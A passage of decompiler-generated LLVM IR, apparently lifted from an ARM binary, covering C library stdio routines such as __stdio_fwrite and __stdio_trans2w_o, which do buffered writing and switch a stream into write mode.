  store i1 %v2_2c53c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c53c, label %dec_label_pc_2c53c.dec_label_pc_2c5cc.loopexit_crit_edge, label %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge

dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge: ; preds = %dec_label_pc_2c53cthread-pre-split
  %v3_2c544.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_2c550.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2c544

dec_label_pc_2c544:                               ; preds = %entry, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge
  %v0_2c550 = phi i32 [ %v0_2c550.pre, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge ], [ %tmp, %entry ]
  %v0_2c54c = phi i32 [ %v5_2c55c, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge ], [ %arg2, %entry ]
  %v3_2c544 = phi i32 [ %v3_2c544.pre, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge ], [ 2147483647, %entry ]
  %v0_2c548.in = phi i32 [ %v5_2c560, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge ], [ %arg3, %entry ]
  %v3_2c548 = phi i32 [ %v5_2c560, %dec_label_pc_2c53cthread-pre-split.dec_label_pc_2c544_crit_edge ], [ %arg3, %entry ]
  %v0_2c548 = icmp slt i32 %v0_2c548.in, 0
  %storemerge = select i1 %v0_2c548, i32 %v3_2c544, i32 %v3_2c548
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v0_2c54c, i32* %r1.global-to-local, align 4
  %v1_2c550 = add i32 %v0_2c550, 4
  %v2_2c550 = inttoptr i32 %v1_2c550 to i32*
  %v3_2c550 = load i32, i32* %v2_2c550, align 4
  %v3_2c554 = call i32 @__GI_write(i32 %v3_2c550, i32 %v0_2c54c)
  %v1_2c558 = icmp slt i32 %v3_2c554, 0
  %v2_2c558 = icmp eq i32 %v3_2c554, 0
  store i1 %v2_2c558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_2c558, label %dec_label_pc_2c568, label %dec_label_pc_2c53cthread-pre-split

dec_label_pc_2c568:                               ; preds = %dec_label_pc_2c544
  %v0_2c568 = load i32, i32* %r4.global-to-local, align 4
  %v1_2c568 = inttoptr i32 %v0_2c568 to i16*
  %v2_2c568 = load i16, i16* %v1_2c568, align 2
  %v3_2c568 = zext i16 %v2_2c568 to i32
  store i32 %v3_2c568, i32* %r3.global-to-local, align 4
  %v1_2c56c = add i32 %v0_2c568, 8
  store i32 %v1_2c56c, i32* %r1.global-to-local, align 4
  %v1_2c570 = inttoptr i32 %v1_2c56c to i32*
  %v2_2c570 = load i32, i32* %v1_2c570, align 4
  store i32 %v2_2c570, i32* %r1.global-to-local, align 4
  %v3_2c570 = add i32 %v0_2c568, 12
  %v4_2c570 = inttoptr i32 %v3_2c570 to i32*
  %v5_2c570 = load i32, i32* %v4_2c570, align 4
  %v1_2c574 = or i32 %v3_2c568, 8
  store i32 %v1_2c574, i32* %r3.global-to-local, align 4
  %v2_2c578 = sub i32 %v5_2c570, %v2_2c570
  store i32 %v2_2c578, i32* %r2.global-to-local, align 4
  %v9_2c578 = icmp eq i32 %v5_2c570, %v2_2c570
  store i1 %v9_2c578, i1* %cpsr_z.global-to-local, align 1
  %v1_2c57c = trunc i32 %v1_2c574 to i16
  store i16 %v1_2c57c, i16* %v1_2c568, align 2
  br i1 %v9_2c578, label %dec_label_pc_2c568.dec_label_pc_2c5c8_crit_edge, label %dec_label_pc_2c584

dec_label_pc_2c568.dec_label_pc_2c5c8_crit_edge:  ; preds = %dec_label_pc_2c568
  %v0_2c5c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2c5c8

dec_label_pc_2c584:                               ; preds = %dec_label_pc_2c568
  %v0_2c584 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c584 = load i32, i32* %r5.global-to-local, align 4
  %v3_2c584 = icmp ult i32 %v0_2c584, %v1_2c584
  %v9_2c584 = icmp eq i32 %v0_2c584, %v1_2c584
  store i1 %v9_2c584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_2c584, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_2c584
  store i32 %v1_2c584, i32* %r2.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_2c584, %bb23
  %v2_2c598.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_2c5ac
  %v2_2c598 = phi i32 [ %v2_2c598.pre, %.preheader ], [ %v1_2c5b0, %dec_label_pc_2c5ac ]
  %v0_2c58c = load i32, i32* %r6.global-to-local, align 4
  %v1_2c58c = inttoptr i32 %v0_2c58c to i8*
  %v2_2c58c = load i8, i8* %v1_2c58c, align 1
  %v3_2c58c = zext i8 %v2_2c58c to i32
  store i32 %v3_2c58c, i32* %r3.global-to-local, align 4
  %v7_2c590 = icmp eq i8 %v2_2c58c, 10
  store i1 %v7_2c590, i1* %cpsr_z.global-to-local, align 1
  %v1_2c594 = add i32 %v0_2c58c, 1
  store i32 %v1_2c594, i32* %r6.global-to-local, align 4
  %v3_2c598 = inttoptr i32 %v2_2c598 to i8*
  store i8 %v2_2c58c, i8* %v3_2c598, align 1
  %v0_2c59c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_2c59c, label %dec_label_pc_2c5a0, label %dec_label_pc_2c5ac

dec_label_pc_2c5a0:                               ; preds = %bb24
  %v0_2c5a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_2c5a0 = inttoptr i32 %v0_2c5a0 to i16*
  %v2_2c5a0 = load i16, i16* %v1_2c5a0, align 2
  %v3_2c5a0 = zext i16 %v2_2c5a0 to i32
  store i32 %v3_2c5a0, i32* %r3.global-to-local, align 4
  %v1_2c5a4 = and i32 %v3_2c5a0, 256
  %v2_2c5a4 = icmp eq i32 %v1_2c5a4, 0
  store i1 %v2_2c5a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2c5a4, label %dec_label_pc_2c5ac, label %dec_label_pc_2c5a0.dec_label_pc_2c5b8_crit_edge

dec_label_pc_2c5a0.dec_label_pc_2c5b8_crit_edge:  ; preds = %dec_label_pc_2c5a0
  %v0_2c5bc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c5b8

dec_label_pc_2c5ac:                               ; preds = %dec_label_pc_2c5a0, %bb24
  %v0_2c5ac = load i32, i32* %r2.global-to-local, align 4
  %v1_2c5ac = add i32 %v0_2c5ac, -1
  store i32 %v1_2c5ac, i32* %r2.global-to-local, align 4
  %v7_2c5ac = icmp eq i32 %v0_2c5ac, 1
  store i1 %v7_2c5ac, i1* %cpsr_z.global-to-local, align 1
  %v0_2c5b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c5b0 = add i32 %v0_2c5b0, 1
  store i32 %v1_2c5b0, i32* %r1.global-to-local, align 4
  br i1 %v7_2c5ac, label %dec_label_pc_2c5ac.dec_label_pc_2c5b8_crit_edge, label %bb24

dec_label_pc_2c5ac.dec_label_pc_2c5b8_crit_edge:  ; preds = %dec_label_pc_2c5ac
  %v0_2c5b8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_2c5b8

dec_label_pc_2c5b8:                               ; preds = %dec_label_pc_2c5a0.dec_label_pc_2c5b8_crit_edge, %dec_label_pc_2c5ac.dec_label_pc_2c5b8_crit_edge
  %v0_2c5bc = phi i32 [ %v1_2c5b0, %dec_label_pc_2c5ac.dec_label_pc_2c5b8_crit_edge ], [ %v0_2c5bc.pre, %dec_label_pc_2c5a0.dec_label_pc_2c5b8_crit_edge ]
  %v0_2c5b8 = phi i32 [ %v0_2c5b8.pre, %dec_label_pc_2c5ac.dec_label_pc_2c5b8_crit_edge ], [ %v0_2c5a0, %dec_label_pc_2c5a0.dec_label_pc_2c5b8_crit_edge ]
  %v1_2c5b8 = add i32 %v0_2c5b8, 8
  %v2_2c5b8 = inttoptr i32 %v1_2c5b8 to i32*
  %v3_2c5b8 = load i32, i32* %v2_2c5b8, align 4
  store i32 %v3_2c5b8, i32* %r3.global-to-local, align 4
  %v2_2c5bc = add i32 %v0_2c5b8, 16
  %v3_2c5bc = inttoptr i32 %v2_2c5bc to i32*
  store i32 %v0_2c5bc, i32* %v3_2c5bc, align 4
  %v0_2c5c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_2c5c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_2c5c0 = sub i32 %v1_2c5c0, %v0_2c5c0
  store i32 %v2_2c5c0, i32* %r3.global-to-local, align 4
  %v1_2c5c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_2c5c4 = sub i32 %v1_2c5c4, %v2_2c5c0
  store i32 %v2_2c5c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_2c5c8

dec_label_pc_2c5c8:                               ; preds = %dec_label_pc_2c568.dec_label_pc_2c5c8_crit_edge, %dec_label_pc_2c5b8
  %v0_2c5c8 = phi i32 [ %v0_2c5c8.pre, %dec_label_pc_2c568.dec_label_pc_2c5c8_crit_edge ], [ %v2_2c5c4, %dec_label_pc_2c5b8 ]
  %v1_2c5c8 = load i32, i32* @r7, align 4
  %v2_2c5c8 = sub i32 %v1_2c5c8, %v0_2c5c8
  br label %dec_label_pc_2c5cc

dec_label_pc_2c53c.dec_label_pc_2c5cc.loopexit_crit_edge: ; preds = %dec_label_pc_2c53cthread-pre-split
  %v0_2c5cc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2c5cc

dec_label_pc_2c5cc:                               ; preds = %entry, %dec_label_pc_2c53c.dec_label_pc_2c5cc.loopexit_crit_edge, %dec_label_pc_2c5c8
  %v0_2c5cc = phi i32 [ %v2_2c5c8, %dec_label_pc_2c5c8 ], [ %v0_2c5cc.pre.pre, %dec_label_pc_2c53c.dec_label_pc_2c5cc.loopexit_crit_edge ], [ 0, %entry ]
  %v2_2c5d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_2c5d0, i32* %r4.global-to-local, align 4
  store i32 %v12_2c524, i32* @r7, align 4
  ret i32 %v0_2c5cc

; uselistorder directives
  uselistorder i32 %v0_2c5b8, { 1, 0 }
  uselistorder i32 %v1_2c5b0, { 0, 2, 1 }
  uselistorder i32 %v0_2c5ac, { 1, 0 }
  uselistorder i32 %v1_2c584, { 0, 2, 1 }
  uselistorder i32 %v0_2c584, { 1, 0 }
  uselistorder i32 %v5_2c570, { 1, 0 }
  uselistorder i32 %v2_2c570, { 1, 0, 2 }
  uselistorder i32 %v3_2c554, { 2, 3, 0, 1 }
  uselistorder i32 %v0_2c54c, { 1, 0 }
  uselistorder i32 %v5_2c560, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 1, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 4, 3, 5, 6, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 5, 3, 2, 6, 7, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 (i32, i32)* @__GI_write, { 1, 3, 2, 0 }
  uselistorder i32 2147483647, { 1, 7, 2, 6, 4, 5, 0, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_2c5cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_2c5c8, { 1, 0 }
  uselistorder label %dec_label_pc_2c5b8, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_2c544, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_2c5d8 = load i32, i32* @r4, align 4
  store i32 %v3_2c5d8, i32* %stack_var_-20, align 4
  %v6_2c5d8 = load i32, i32* @r5, align 4
  %v9_2c5d8 = load i32, i32* @r6, align 4
  %v12_2c5d8 = load i32, i32* @r7, align 4
  %v3_2c5dc = load i16, i16* %arg3, align 2
  %v4_2c5dc = zext i16 %v3_2c5dc to i32
  %v1_2c5e0 = and i32 %v4_2c5dc, 512
  store i32 %v1_2c5e0, i32* @r4, align 4
  %v2_2c5e0 = icmp eq i32 %v1_2c5e0, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_2c5e0, label %dec_label_pc_2c5f8, label %dec_label_pc_2c6f4

dec_label_pc_2c5f8:                               ; preds = %entry
  %v2_2c5f8 = add i32 %tmp, 4
  %v3_2c5f8 = inttoptr i32 %v2_2c5f8 to i32*
  %v4_2c5f8 = load i32, i32* %v3_2c5f8, align 4
  %v2_2c600 = add i32 %tmp, 16
  %v3_2c600 = inttoptr i32 %v2_2c600 to i32*
  %v4_2c600 = load i32, i32* %v3_2c600, align 4
  store i32 %v4_2c600, i32* @r0, align 4
  %v2_2c604 = add i32 %tmp, 12
  %v3_2c604 = inttoptr i32 %v2_2c604 to i32*
  %v4_2c604 = load i32, i32* %v3_2c604, align 4
  store i32 %v4_2c604, i32* @r3, align 4
  %v4_2c608 = icmp eq i32 %v4_2c5f8, -2
  %v2_2c60c = sub i32 %v4_2c604, %v4_2c600
  br i1 %v4_2c608, label %dec_label_pc_2c60c, label %dec_label_pc_2c634

dec_label_pc_2c60c:                               ; preds = %dec_label_pc_2c5f8
  %v3_2c610 = icmp ugt i32 %v2_2c60c, %arg2
  br i1 %v3_2c610, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_2c60c
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_2c60c, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_2c60c, %dec_label_pc_2c60c ]
  %v0_2c618 = phi i32 [ %arg2, %bb ], [ %v2_2c60c, %dec_label_pc_2c60c ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_2c618, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2c620 = call i32 @memcpy()
  %v0_2c624 = load i32, i32* @r5, align 4
  %v1_2c624 = add i32 %v0_2c624, 16
  %v2_2c624 = inttoptr i32 %v1_2c624 to i32*
  %v3_2c624 = load i32, i32* %v2_2c624, align 4
  %v1_2c628 = load i32, i32* @r4, align 4
  %v2_2c628 = add i32 %v1_2c628, %v3_2c624
  store i32 %v2_2c628, i32* %v2_2c624, align 4
  br label %dec_label_pc_2c708

dec_label_pc_2c634:                               ; preds = %dec_label_pc_2c5f8
  store i32 %v2_2c60c, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_2c60c, %arg2
  br i1 %tmp18, label %dec_label_pc_2c6d4, label %dec_label_pc_2c640

dec_label_pc_2c640:                               ; preds = %dec_label_pc_2c634
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_2c648 = call i32 @memcpy()
  %v0_2c64c = load i32, i32* @r5, align 4
  %v1_2c64c = add i32 %v0_2c64c, 16
  %v2_2c64c = inttoptr i32 %v1_2c64c to i32*
  %v3_2c64c = load i32, i32* %v2_2c64c, align 4
  %v1_2c650 = inttoptr i32 %v0_2c64c to i16*
  %v2_2c650 = load i16, i16* %v1_2c650, align 2
  %v1_2c654 = load i32, i32* @r6, align 4
  %v2_2c654 = add i32 %v1_2c654, %v3_2c64c
  %v1_2c658 = and i16 %v2_2c650, 256
  %v2_2c658 = icmp eq i16 %v1_2c658, 0
  store i32 %v2_2c654, i32* %v2_2c64c, align 4
  br i1 %v2_2c658, label %dec_label_pc_2c708, label %dec_label_pc_2c664

dec_label_pc_2c664:                               ; preds = %dec_label_pc_2c640
  %v0_2c664 = load i32, i32* @r7, align 4
  %v0_2c66c = load i32, i32* @r6, align 4
  %v4_2c670 = call i32 @memrchr(i32 %v0_2c664, i32 10, i32 %v0_2c66c, i32 %v2_2c654)
  %v2_2c674 = icmp eq i32 %v4_2c670, 0
  br i1 %v2_2c674, label %dec_label_pc_2c708, label %dec_label_pc_2c67c

dec_label_pc_2c67c:                               ; preds = %dec_label_pc_2c664
  %v0_2c67c = load i32, i32* @r5, align 4
  store i32 %v0_2c67c, i32* @r0, align 4
  %v0_2c680 = call i32 @__stdio_wcommit()
  %v2_2c684 = icmp eq i32 %v0_2c680, 0
  br i1 %v2_2c684, label %dec_label_pc_2c708, label %dec_label_pc_2c68c

dec_label_pc_2c68c:                               ; preds = %dec_label_pc_2c67c
  %v1_2c68c = load i32, i32* @r6, align 4
  %v3_2c68c = icmp uge i32 %v0_2c680, %v1_2c68c
  %v1_2c68c.v0_2c680 = select i1 %v3_2c68c, i32 %v1_2c68c, i32 %v0_2c680
  store i32 %v1_2c68c.v0_2c680, i32* @r4, align 4
  %v2_2c698 = sub i32 %v1_2c68c, %v1_2c68c.v0_2c680
  %v0_2c69c = load i32, i32* @r7, align 4
  %v2_2c69c = add i32 %v0_2c69c, %v2_2c698
  store i32 %v2_2c69c, i32* %r7.global-to-local, align 4
  store i32 %v2_2c69c, i32* @r0, align 4
  store i32 %v1_2c68c.v0_2c680, i32* @r2, align 4
  %v4_2c6ac = call i32 @__GI_memchr(i32 %v2_2c69c, i32 10, i32 %v1_2c68c.v0_2c680, i32 %v2_2c698)
  %v2_2c6b0 = icmp eq i32 %v4_2c6ac, 0
  br i1 %v2_2c6b0, label %dec_label_pc_2c708, label %dec_label_pc_2c6b8

dec_label_pc_2c6b8:                               ; preds = %dec_label_pc_2c68c
  %v0_2c6b8 = load i32, i32* @r5, align 4
  %v1_2c6b8 = add i32 %v0_2c6b8, 16
  %v2_2c6b8 = inttoptr i32 %v1_2c6b8 to i32*
  %v3_2c6b8 = load i32, i32* %v2_2c6b8, align 4
  %v0_2c6bc = load i32, i32* %r7.global-to-local, align 4
  %v1_2c6bc = load i32, i32* @r4, align 4
  %v2_2c6bc = sub i32 %v0_2c6bc, %v4_2c6ac
  %v2_2c6c0 = add i32 %v2_2c6bc, %v1_2c6bc
  %v2_2c6c4 = sub i32 %v3_2c6b8, %v2_2c6c0
  %v1_2c6c8 = load i32, i32* @r6, align 4
  %v2_2c6c8 = sub i32 %v1_2c6c8, %v2_2c6c0
  store i32 %v2_2c6c8, i32* @r6, align 4
  store i32 %v2_2c6c4, i32* %v2_2c6b8, align 4
  br label %dec_label_pc_2c708

dec_label_pc_2c6d4:                               ; preds = %dec_label_pc_2c634
  %v2_2c6d4 = add i32 %tmp, 8
  %v3_2c6d4 = inttoptr i32 %v2_2c6d4 to i32*
  %v4_2c6d4 = load i32, i32* %v3_2c6d4, align 4
  %v9_2c6d8 = icmp eq i32 %v4_2c600, %v4_2c6d4
  br i1 %v9_2c6d8, label %dec_label_pc_2c6f4, label %dec_label_pc_2c6e0

dec_label_pc_2c6e0:                               ; preds = %dec_label_pc_2c6d4
  store i32 %tmp, i32* @r0, align 4
  %v0_2c6e4 = call i32 @__stdio_wcommit()
  %v2_2c6e8 = icmp eq i32 %v0_2c6e4, 0
  br i1 %v2_2c6e8, label %dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge, label %bb15

dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge:  ; preds = %dec_label_pc_2c6e0
  %v0_2c6f4.pre = load i32, i32* @r6, align 4
  %v0_2c6f8.pre = load i32, i32* @r5, align 4
  %v0_2c6fc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2c6f4

bb15:                                             ; preds = %dec_label_pc_2c6e0
  %v1_2c6ec = load i32, i32* @r4, align 4
  store i32 %v1_2c6ec, i32* @r6, align 4
  br label %dec_label_pc_2c708

dec_label_pc_2c6f4:                               ; preds = %dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge, %entry, %dec_label_pc_2c6d4
  %v0_2c6fc = phi i32 [ %v0_2c6fc.pre, %dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_2c6d4 ]
  %v0_2c6f8 = phi i32 [ %v0_2c6f8.pre, %dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_2c6d4 ]
  %v0_2c6f4 = phi i32 [ %v0_2c6f4.pre, %dec_label_pc_2c6e0.dec_label_pc_2c6f4_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_2c6d4 ]
  %v1_2c6f8 = inttoptr i32 %v0_2c6f8 to i16*
  %v5_2c700 = call i32 @__stdio_WRITE(i16* %v1_2c6f8, i32 %v0_2c6fc, i32 %v0_2c6f4)
  store i32 %v5_2c700, i32* @r6, align 4
  br label %dec_label_pc_2c708

dec_label_pc_2c708:                               ; preds = %bb15, %dec_label_pc_2c68c, %dec_label_pc_2c67c, %dec_label_pc_2c664, %dec_label_pc_2c640, %dec_label_pc_2c6b8, %bb12, %dec_label_pc_2c6f4
  %v0_2c708 = load i32, i32* @r6, align 4
  %v2_2c710 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_2c710, i32* @r4, align 4
  store i32 %v6_2c5d8, i32* @r5, align 4
  store i32 %v9_2c5d8, i32* @r6, align 4
  store i32 %v12_2c5d8, i32* @r7, align 4
  ret i32 %v0_2c708

; uselistorder directives
  uselistorder i32 %v2_2c6c0, { 1, 0 }
  uselistorder i32 %v2_2c698, { 1, 0 }
  uselistorder i32 %v1_2c68c.v0_2c680, { 1, 2, 0, 3 }
  uselistorder i32 %v1_2c68c, { 1, 0, 2 }
  uselistorder i32 %v2_2c60c, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 (i16*, i32, i32)* @__stdio_WRITE, { 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_2c708, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_2c6f4, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_2c718 = load i32, i32* @r4, align 4
  store i32 %v3_2c718, i32* %stack_var_-8, align 4
  %v3_2c71c = load i16, i16* %arg1, align 2
  %v4_2c71c = zext i16 %v3_2c71c to i32
  %v2_2c720 = and i32 %v4_2c71c, %arg2
  %v4_2c720 = icmp eq i32 %v2_2c720, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_2c720, label %dec_label_pc_2c72c, label %dec_label_pc_2c73c

dec_label_pc_2c72c:                               ; preds = %entry
  %v1_2c72c = and i32 %v4_2c71c, 2176
  %v2_2c72c = icmp eq i32 %v1_2c72c, 0
  br i1 %v2_2c72c, label %dec_label_pc_2c734, label %dec_label_pc_2c748

dec_label_pc_2c734:                               ; preds = %dec_label_pc_2c72c
  %v2_2c734 = or i32 %v4_2c71c, %arg2
  %v1_2c738 = trunc i32 %v2_2c734 to i16
  store i16 %v1_2c738, i16* %arg1, align 2
  %v0_2c73c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2c73c

dec_label_pc_2c73c:                               ; preds = %entry, %dec_label_pc_2c734
  %v0_2c778 = phi i32 [ %tmp, %entry ], [ %v0_2c73c.pre, %dec_label_pc_2c734 ]
  %v1_2c73c = inttoptr i32 %v0_2c778 to i16*
  %v2_2c73c = load i16, i16* %v1_2c73c, align 2
  %v3_2c73c = zext i16 %v2_2c73c to i32
  store i32 %v3_2c73c, i32* @ip, align 4
  %v1_2c740 = and i32 %v3_2c73c, 32
  %v2_2c740 = icmp eq i32 %v1_2c740, 0
  br i1 %v2_2c740, label %dec_label_pc_2c768, label %dec_label_pc_2c748

dec_label_pc_2c748:                               ; preds = %dec_label_pc_2c72c, %dec_label_pc_2c73c
  %v0_2c748 = call i32 @__GI___errno_location()
  store i32 %v0_2c748, i32* %r0.global-to-local, align 4
  %v2_2c750 = inttoptr i32 %v0_2c748 to i32*
  store i32 9, i32* %v2_2c750, align 4
  br label %dec_label_pc_2c754

dec_label_pc_2c754:                               ; preds = %dec_label_pc_2c790, %dec_label_pc_2c748
  %v0_2c754 = load i32, i32* @r4, align 4
  %v1_2c754 = inttoptr i32 %v0_2c754 to i16*
  %v2_2c754 = load i16, i16* %v1_2c754, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_2c75c = or i16 %v2_2c754, 8
  store i16 %v1_2c75c, i16* %v1_2c754, align 2
  br label %bb11

dec_label_pc_2c768:                               ; preds = %dec_label_pc_2c73c
  %tmp14 = urem i16 %v2_2c73c, 4
  %v2_2c768 = icmp eq i16 %tmp14, 0
  br i1 %v2_2c768, label %dec_label_pc_2c7c4, label %dec_label_pc_2c770

dec_label_pc_2c770:                               ; preds = %dec_label_pc_2c768
  %v1_2c770 = and i32 %v3_2c73c, 4
  store i32 %v1_2c770, i32* @r1, align 4
  %v2_2c770 = icmp eq i32 %v1_2c770, 0
  br i1 %v2_2c770, label %dec_label_pc_2c778, label %dec_label_pc_2c7a8

dec_label_pc_2c778:                               ; preds = %dec_label_pc_2c770
  %v1_2c778 = add i32 %v0_2c778, 20
  %v2_2c778 = inttoptr i32 %v1_2c778 to i32*
  %v3_2c778 = load i32, i32* %v2_2c778, align 4
  store i32 %v3_2c778, i32* %r2.global-to-local, align 4
  %v1_2c77c = add i32 %v0_2c778, 16
  %v2_2c77c = inttoptr i32 %v1_2c77c to i32*
  %v3_2c77c = load i32, i32* %v2_2c77c, align 4
  %v9_2c780 = icmp eq i32 %v3_2c778, %v3_2c77c
  br i1 %v9_2c780, label %dec_label_pc_2c788, label %dec_label_pc_2c790

dec_label_pc_2c788:                               ; preds = %dec_label_pc_2c778
  %v1_2c788 = and i32 %v3_2c73c, 2
  %v2_2c788 = icmp eq i32 %v1_2c788, 0
  br i1 %v2_2c788, label %dec_label_pc_2c7a8, label %dec_label_pc_2c790

dec_label_pc_2c790:                               ; preds = %dec_label_pc_2c778, %dec_label_pc_2c788
  %v1_2c790 = and i32 %v3_2c73c, 1024
  %tmp12 = udiv i32 %v1_2c790, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_2c79c = call i32 @__GI_fseek()
  store i32 %v0_2c79c, i32* %r0.global-to-local, align 4
  %v2_2c7a0 = icmp eq i32 %v0_2c79c, 0
  br i1 %v2_2c7a0, label %.dec_label_pc_2c7a8_crit_edge, label %dec_label_pc_2c754

.dec_label_pc_2c7a8_crit_edge:                    ; preds = %dec_label_pc_2c790
  %v0_2c7a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2c7a8

dec_label_pc_2c7a8:                               ; preds = %.dec_label_pc_2c7a8_crit_edge, %dec_label_pc_2c770, %dec_label_pc_2c788
  %v2_2c7b4 = phi i32 [ %v0_2c7a8.pre, %.dec_label_pc_2c7a8_crit_edge ], [ %v0_2c778, %dec_label_pc_2c770 ], [ %v0_2c778, %dec_label_pc_2c788 ]
  %v1_2c7a8 = inttoptr i32 %v2_2c7b4 to i16*
  %v2_2c7a8 = load i16, i16* %v1_2c7a8, align 2
  %v1_2c7ac = add i32 %v2_2c7b4, 8
  %v2_2c7ac = inttoptr i32 %v1_2c7ac to i32*
  %v3_2c7ac = load i32, i32* %v2_2c7ac, align 4
  store i32 %v3_2c7ac, i32* %r2.global-to-local, align 4
  %v1_2c7b0 = and i16 %v2_2c7a8, -4
  store i16 %v1_2c7b0, i16* %v1_2c7a8, align 2
  %v0_2c7b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c7b8 = load i32, i32* @r4, align 4
  %v2_2c7b8 = add i32 %v1_2c7b8, 20
  %v3_2c7b8 = inttoptr i32 %v2_2c7b8 to i32*
  store i32 %v0_2c7b8, i32* %v3_2c7b8, align 4
  %v0_2c7bc = load i32, i32* %r2.global-to-local, align 4
  %v1_2c7bc = load i32, i32* @r4, align 4
  %v2_2c7bc = add i32 %v1_2c7bc, 24
  %v3_2c7bc = inttoptr i32 %v2_2c7bc to i32*
  store i32 %v0_2c7bc, i32* %v3_2c7bc, align 4
  %v0_2c7c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c7c0 = load i32, i32* @r4, align 4
  %v2_2c7c0 = add i32 %v1_2c7c0, 16
  %v3_2c7c0 = inttoptr i32 %v2_2c7c0 to i32*
  store i32 %v0_2c7c0, i32* %v3_2c7c0, align 4
  %v0_2c7c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2c7c4

dec_label_pc_2c7c4:                               ; preds = %dec_label_pc_2c768, %dec_label_pc_2c7a8
  %v2_2c7d0 = phi i32 [ %v0_2c778, %dec_label_pc_2c768 ], [ %v0_2c7c4.pre, %dec_label_pc_2c7a8 ]
  %v1_2c7c4 = inttoptr i32 %v2_2c7d0 to i16*
  %v2_2c7c4 = load i16, i16* %v1_2c7c4, align 2
